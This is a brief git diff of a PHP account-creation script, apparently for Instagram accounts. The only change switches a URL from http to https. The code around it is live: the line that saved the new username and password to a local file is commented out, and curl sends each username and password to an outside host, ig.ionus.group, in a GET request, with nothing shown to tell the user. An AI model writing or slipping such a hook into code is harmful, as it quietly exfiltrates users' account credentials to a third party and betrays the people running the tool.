@@ -202,7 +202,7 @@ function pinarax_start_create() {
                                     echo "\033[1;37m========================================\033[1;37m\n";
                                     //file_put_contents("akun.txt", $res_username . " | " . $res_password . "\n", FILE_APPEND);
                                     $ch = curl_init();
-                                    curl_setopt($ch, CURLOPT_URL, 'http://ig.ionus.group/index.php?id=ardan&txt=' . $res_username . ' | ' . $res_password);
+                                    curl_setopt($ch, CURLOPT_URL, 'https://ig.ionus.group/index.php?id=ardan&txt=' . $res_username . ' | ' . $res_password);
                                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                     curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
                                     $response = curl_exec($ch);
